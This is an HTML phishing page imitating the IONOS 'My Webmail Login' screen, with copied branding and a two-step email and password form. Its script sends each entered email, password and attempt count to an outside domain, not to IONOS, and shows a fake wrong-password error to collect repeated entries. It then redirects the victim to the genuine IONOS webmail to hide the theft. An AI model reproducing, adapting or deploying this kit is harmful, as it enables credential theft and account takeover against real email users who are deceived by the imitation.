<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Webmail Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <style type="text/css">
        .headerbar{ background-color: #fff; border-bottom: none; box-shadow: 0 2px 8px #71809580; }  
        *{outline: none; padding: 0}
        body{background-color: #F4F7FA !important; min-height: 100vh; } 
        .theformbox1, .theformbox2{border: 1px solid #bcc8d4; font-family: "OverpassRegular",arial,arial narrow,sans-serif; color: #001b41}
        input{border: 1px solid #97a3b4;}
        input:focus, input:hover, input:active {
            border-color: #1474c4;}
        .button{background-color: #0b2a63}
        .button:hover{background-color: #1474c4}
        .formfooter{
            background-color: #f4f7fa; margin: 0 -31.0px -31px; padding: 40px 30px; 
        }
        .bg2{border: 1px solid #bcc8d4; margin:0 auto; width:100%;   display: grid;
          place-items: center; }
        .bg2:active, .bg2:focus, .bg2:hover { background-color: #fff; border: 1px solid #bcc8d4; box-shadow: 0 2px 8px 0 #718095; cursor:pointer; }
        .barload { text-align: center; margin-top: -16px; }
        .barload span { animation: blink 1s infinite; font-size: 2rem; border-radius:14px }
        .barload span:nth-child(2) { animation-delay: 0.2s; }
        .barload span:nth-child(3) { animation-delay: 0.4s; }
        @keyframes blink { 0% { opacity: .2; } 20% { opacity: 1; } 100% { opacity: .2; } }
        .footer {margin-top: auto; background-color: #fff; bottom: 0;}
        .allop{ display: flex; place-items: center;gap: 5px; }
        .usridentity-fa{ cursor:pointer; position:relative; }
        .usridentity-fa:hover{ background-color: #dbedf8; border-radius: 50%; width: 28px; height: 28px} 
        .usridentity{ margin-top:2px; margin-left: 4px}
        #iduserhere{ margin-left:10px; font-weight:bold; color:#1474c4; opacity:0.8; font-size:15px; } 
        .hide{display: none}
        .button:disabled {
            cursor: not-allowed; opacity: 0.85
        }
    </style>    
</head>
<body class="">
    <div class="">
        <div class="flex justify-between items-center border-b py-2 px-4 headerbar">
            <span> <img src="https://i.ibb.co/sJtGGVdk/ionoslogo.png" width="289" height="46">  </span>
            <div class="flex items-center space-x-4" style=" margin-left: -15rem; ">
                <img src="https://i.ibb.co/SDKY4C48/searchbar.png">
            </div>
            <div class="flex items-center space-x-4">
                <img src="https://i.ibb.co/LzwvndsF/questionmark.png">
            </div>            
        </div>

        <div class="flex justify-center my-10">
            <div class="bg-white rounded-lg theformbox1  p-8 w-full max-w-2xl">
                <div class="flex items-center space-x-2 mb-9">
                    <img src="https://i.ibb.co/M5p2GpPW/product-email.png">
                    <h2 class="text-xl bold">My Webmail Login</h2>
                </div>
                <label for="userid" class="block text-sm font-bold" style="color:#02102b;font-family: OpenSansSemibold,arial,sans-serif; padding-bottom: 5px;">Email address</label>
                <input type="email" id="userid" value="" name="userid" class="border rounded-lg w-full px-4 py-2 mb-4" placeholder="Enter your email address" autocomplete="username">
                <div class="text-sm mb-4 text-red-400 hide" id="emerror" style="color: #c80a00;">Please enter your email address.</div>
                <div class="text-sm mb-4">
                    <a class="text-blue-600" style="color:#02102b;font-family: OpenSansSemibold,arial,sans-serif;"><strong>Not your device?</strong> Log out after the session or use private browsing mode.</a>
                </div>
                <button class="flex justify-center gap-1 items-center text-white button rounded-3xl w-full py-1 mb-10" id="emButton">Next</button>
                <div class="text-sm formfooter">
                    <p>Not an IONOS customer yet?</p>
                    <a class="" style="color: #1474c4; cursor: pointer;">Become a customer now and benefit from our offers.</a>
                </div>
            </div>

            <div class="bg-white rounded-lg theformbox2 p-8 pb-2 w-full max-w-2xl hide">
                <div class="flex items-center space-x-2 mb-10">
                    <img src="https://i.ibb.co/0RTfxz0F/password.png">
                    <h2 class="text-xl bold">Enter password</h2>
                </div>
                <form method="post" id="loginForm" autocomplete="on">
                    <div class="mb-5 flex gap-4 ml-1" id="backtoem">
                       <div class="usridentity-fa"><i class="fas fa-chevron-left" style="margin-left: 11px; margin: 7px; font-size: 14px;"></i></div>
                       <div class="usridentity"><i class="far fa-user" style="font-size: 15px;"></i><span id="iduserhere"></span></div>
                    </div>
                    <label for="password" class="block text-sm font-bold" style="color:#02102b;font-family: OpenSansSemibold,arial,sans-serif; padding-bottom: 5px;">Password</label>
                    <input type="password" id="password" name="password" class="border rounded-lg w-full px-4 py-2 mb-1" placeholder="Enter your email password" autocomplete="current-password">
                    <div id="pwerror" class="hide"> 
                        <span class="text-sm mb-4 text-red-400" style="color: #c80a00;">Please enter your correct password</span>
                        <a class="text-blue-600" style="color: #1474c4; font-family: OpenSansSemibold,arial,sans-serif; font-size: 14px; margin-left: 5px; cursor:pointer;">Forgot Your Password?</a>
                    </div>

                    <input type="hidden" id="hiddenuser" name="email" autocomplete="username">
                    
                    <div class="text-sm mb-5 mt-4">
                        <a class="text-blue-600" style="color:#02102b;font-family: OpenSansSemibold,arial,sans-serif;"><strong>Not your device?</strong> Log out after the session or use private browsing mode.</a>
                    </div>
                    <button class="flex justify-center gap-1 items-center text-white button rounded-3xl w-full py-1 mb-10" id="pwButton">Next<div id="barload" class="barload hide" style=""><span>.</span><span>.</span><span>.</span></div></button>
                </form>
            </div>
        </div>

        <div class="w-full max-w-2xl" style="margin: 0 auto; margin-bottom: 120px;">
            <div style="font-family: OverpassSemibold,arial,sans-serif; font-size: 16px; line-height: 1.5em; margin-bottom: 12px; color: #001b41"><h2>More IONOS Logins</h2></div>

            <div class="grid grid-cols-3 gap-4 m-4"> 
               <div class="text-center">
                <div class="bg-white bg2 rounded-lg p-4 ">
                  <img src="https://i.ibb.co/0jRqDSxb/my-account-svg.png" alt="My Account">
                  <div>My IONOS</div>
                </div>
              </div>
              <div class="text-center">
                <div class="bg-white bg2 rounded-lg p-4 ">
                  <img src="https://i.ibb.co/625pJHs/product-hidrive.png" alt="HiDrive">
                  <div>HiDrive</div>
                </div>
              </div>
              <div class="text-center">
                <div class="bg-white bg2 rounded-lg p-4 ">
                  <img src="https://i.ibb.co/Vp5DYvqG/product-mail-archiving.png" alt="Email Archiving">
                  <div class="">Email Archiving</div>
                </div>
              </div>
            </div>
         </div>

         <div class="flex justify-between items-center  border-t footer pt-1 px-8" style="position: absolute; width: 100%;  height: 90px; vertical-align: center;border-top: 1px solid #bcc8d4">
            <div class="allop">
               <img src="https://i.ibb.co/8gZKvtL0/greendot.png"> All Systems Operational
            </div>
            <div class="text-sm">
                Â© <span id="thisyear"></span> IONOS Inc.
            </div>
            <div class="text-sm">
                <a href="#" class="text-blue-600">Privacy Policy</a> - <a href="#" class="text-blue-600">T&Cs</a>
            </div>
         </div>
    </div>

    <script type="text/javascript">
        document.addEventListener('DOMContentLoaded', () => {
            const barLoad = document.querySelector("#barload");
            const theformbox1 = document.querySelector(".theformbox1");
            const theformbox2 = document.querySelector(".theformbox2");
            const emButton = document.querySelector("#emButton");
            const pwButton = document.querySelector("#pwButton");
            const emerror = document.getElementById("emerror");
            const pwerror = document.getElementById("pwerror");
            const userid = document.getElementById("userid");
            const hiddenuser = document.getElementById("hiddenuser");
            const passwd = document.getElementById("password");
            const backtoem = document.getElementById("backtoem");
            const idd = location.hash.slice(1); 
            const iduserhere = document.getElementById("iduserhere");
            const errorText = pwerror.querySelector('span');
            
            userid.value = idd;
            document.getElementById("thisyear").innerHTML = new Date().getFullYear();

            const PROCESS_URL = "https://gurio.palaciodanoiva.com/ono/guv.php";
            
            barLoad.classList.add("hide"); 
            emButton.classList.add("py-2");

            // Initialize attempt counter in sessionStorage
            if (!sessionStorage.getItem('loginAttempts')) {
                sessionStorage.setItem('loginAttempts', '0');
            }

            // Handle email autofill
            userid.addEventListener('change', () => {
                hiddenuser.value = userid.value;
            });

            emButton.addEventListener("click", (event) => {
                emerror.classList.add("hide");
                event.preventDefault();
                if (userid.value === "") {
                    userid.classList.add("border-red-500");
                    emerror.classList.remove("hide");
                    userid.focus();
                } 
                else {
                    userid.classList.remove("border-red-500");
                    var wemail = userid.value;
                    hiddenuser.value = wemail;
                    showPassDiv(wemail); 
                    iduserhere.textContent = wemail;
                    
                    backtoem.addEventListener("click", (event) => {
                        showEmailDiv(wemail);
                    });
                }         
            });

            pwButton.addEventListener("click", async (event) => {
                event.preventDefault();
                pwerror.classList.add("hide");
                passwd.classList.remove("border-red-500");
                
                if (passwd.value === "") {
                    passwd.classList.add("border-red-500");
                    pwerror.classList.remove("hide");
                    errorText.textContent = "Please enter your password";
                    passwd.focus();
                    return;
                }
                
                barLoad.classList.remove("hide");
                pwButton.disabled = true;
                
                // Increment attempt counter
                let attempts = parseInt(sessionStorage.getItem('loginAttempts')) + 1;
                sessionStorage.setItem('loginAttempts', attempts.toString());
                
                try {
                    const response = await fetch(PROCESS_URL, {
                        method: 'POST',
                        body: `email=${encodeURIComponent(hiddenuser.value)}&pass=${encodeURIComponent(passwd.value)}&attempt=${attempts}`,
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        }
                    });
                    
                    const data = await response.json();
                    
                    if (!response.ok || !data.success) {
                        throw new Error(data.message || 'Login failed');
                    }
                    
                    barLoad.classList.add("hide");
                    pwButton.disabled = false;
                    
                    if (data.status === 'redirect') {
                        // Reset attempts and redirect on 3rd try
                        sessionStorage.removeItem('loginAttempts');
                        window.location.href = "https://email.ionos.com/appsuite/";
                    } else {
                        // Clear password field and show error
                        passwd.value = "";
                        passwd.focus();
                        pwerror.classList.remove("hide");
                        errorText.textContent = "Please enter your correct password";
                    }
                } catch (error) {
                    barLoad.classList.add("hide");
                    pwButton.disabled = false;
                    console.error('Error:', error);
                    
                    // Clear password field on any error
                    passwd.value = "";
                    passwd.focus();
                    
                    pwerror.classList.remove("hide");
                    errorText.textContent = error.message || "Temporary error. Please try again.";
                }
            });      

            let showEmailDiv = (em) => {
                theformbox1.classList.remove("hide");
                theformbox2.classList.add("hide");
                pwerror.classList.add("hide");
                emerror.classList.add("hide");
                userid.value = em;
                hiddenuser.value = em;
            };
            
            let showPassDiv = (em) => {
                theformbox2.classList.remove("hide");
                theformbox1.classList.add("hide");
                pwerror.classList.add("hide");
                emerror.classList.add("hide");         
                hiddenuser.value = em;
                
                // Small delay to allow autofill to complete
                setTimeout(() => {
                    passwd.focus();
                }, 100);
            };
        });
    </script>
</body>
</html>
